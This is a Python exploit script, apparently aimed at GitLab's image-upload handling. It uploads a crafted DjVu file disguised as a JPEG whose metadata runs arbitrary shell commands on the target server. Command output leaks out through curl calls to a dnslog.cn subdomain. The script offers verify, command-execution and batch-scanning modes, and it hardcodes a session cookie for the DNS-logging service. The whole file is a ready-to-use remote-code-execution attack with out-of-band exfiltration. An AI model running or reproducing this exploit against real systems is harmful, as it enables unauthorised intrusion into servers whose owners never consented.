import getopt
import sys
import time
import requests
from bs4 import BeautifulSoup


def vulVerify(url):
    url=url.strip('/')
    session=requests.Session()
    try:
        response=session.get(url+'/users/sing_in',verify=False)
        soup=BeautifulSoup(response.text,features='lxml')
        token=soup.findAll('meta')[16].get('content')
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}",
                "Accept-Encoding": "gzip, deflate"}
        data= "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.kmkn73.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        flag='Failed to process image'
        response=session.post(url+'/uploads/user',headers=headers,data=data,verify=False)
        if flag in response.text:
            print("[+]存在漏洞")
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print('验证漏洞失败，出现错误：'+str(e))

def attack(cmd,url):
    url = url.strip('/')
    session = requests.Session()
    try:
        response = session.get(url + '/users/sing_in', verify=False)
        soup = BeautifulSoup(response.text, features='lxml')
        token = soup.findAll('meta')[16].get('content')
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}",
            "Accept-Encoding": "gzip, deflate"}
        getdomain=getdns()
        data= "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `"+cmd.strip(' ')+"`."+getdomain.text+"} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        flag = 'Failed to process image'
        response = session.post(url + '/uploads/user', headers=headers, data=data, verify=False)
        if flag in response.text:
            print("[+]存在漏洞")
            dnslog(getdomain)
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print('验证漏洞失败，出现错误：'+str(e))
def getdns():
    headers={
    'Cookie': 'SL_G_WPT_TO=zh-CN; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; PHPSESSID=pcnsbogtad16ea2eig4j1ks1l0'
    }
    getdomain=requests.get(url='http://dnslog.cn/getdomain.php',headers=headers,timeout=60)
    print('DNS为：{}'.format(getdomain.text))
    return getdomain
def dnslog(getdomain):
    headers={
    'Cookie': 'SL_G_WPT_TO=zh-CN; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; PHPSESSID=pcnsbogtad16ea2eig4j1ks1l0'
    }
    for i in range(0,10):
        try:
            refresh=requests.get(url='http://dnslog.cn/getrecords.php',headers=headers,timeout=60)
            time.sleep(1)
            if str(getdomain.text) in refresh.text:
                print(refresh.text)
        except Exception as e:
            print("获取dnslog出现错误：{0}".format(e))
def fileScan(filename):
    file = open(filename, 'r',encoding='utf-8')
    for line in file.readlines():
        if line[:4]!='http':
            line='http://'+line.strip()
        else:
            pass
        print(line.strip()+':')
        vulVerify(line.strip())

def main():
    (opts,args)=getopt.getopt(sys.argv[1:],'-h,-v,-c:,-f:,-u:')
    for opt_name,opt_value in opts:
        if opt_name in ('-h','--help'):
            print("Usage:python {0} [-v(验证漏洞)] [-c command(执行命令）] -u url".format(sys.argv[0]))
            print('''Usage:
            验证漏洞：python {0} -u url -v
            执行命令：python {0} -u url -c whoami
            批量验证：python {0} -f filename
            '''.format(sys.argv[0]))
        if opt_name in ('-u'):
            url=opt_value
        elif opt_name in ('-f'):
            filename=opt_value
            fileScan(filename)
        if opt_name in('-v'):
            vulVerify(url)
        if opt_name in ('-c'):
            cmd=opt_value
            attack(cmd,url)

if __name__=='__main__':
    main()